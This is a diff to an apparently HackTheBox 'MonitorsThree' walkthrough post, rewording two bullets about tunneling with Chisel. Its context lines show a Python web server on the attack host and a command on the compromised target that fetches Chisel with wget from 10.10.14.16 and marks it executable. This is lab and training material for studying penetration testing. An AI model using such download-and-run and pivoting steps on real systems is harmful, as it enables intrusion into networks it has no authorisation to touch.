@@ -162,7 +162,7 @@ We can start our enumeration by enumerating ports listening locally on the targe
 ![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-ports.png){: .center}
 
 We can download Chisel on the target and scan those ports to identify running services.
-- We can start a Python server in the directory containing Chisel.
+- We need to start a Python server in the directory containing Chisel.
 ```bash
 ┌──(pentester㉿kali)-[/opt]
 └─$ ls -l
@@ -174,7 +174,7 @@ We can download Chisel on the target and scan those ports to identify running se
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-- We can use wget on the target to download Chisel from our attack host and run it in server mode.
+- Then we can use wget on the target to download Chisel from our attack host and run it in server mode.
 ```bash
 marcus@monitorsthree.htb:/tmp$ wget 10.10.14.16/chisel; chmod 755 chisel
 <SNIP>            
